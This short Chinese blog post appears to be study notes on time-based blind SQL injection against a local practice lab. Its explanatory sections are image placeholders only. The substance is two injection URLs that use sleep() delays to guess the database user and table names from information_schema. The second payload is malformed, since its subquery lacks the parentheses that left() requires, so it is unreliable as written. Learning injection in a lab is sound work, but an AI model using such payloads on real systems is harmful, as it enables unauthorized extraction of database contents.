---
layout: post
title: "1.3.2-SQL注入-SQL盲注-时间盲注"
date: 2018-06-23
category: web安全
tags: web安全 sql注入 时间盲注
---

## 时间盲注

### 时间盲注原理
【图片】
【图片】



### 时间盲注方法

[时间tupian]
	
	http://localhost:90/Less-10/?id=1" and if(left(user(),1)='a',0,sleep(3))--+

	http://localhost:90/Less-10/?id=1" and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='r',0,sleep(3))--+

【图片】
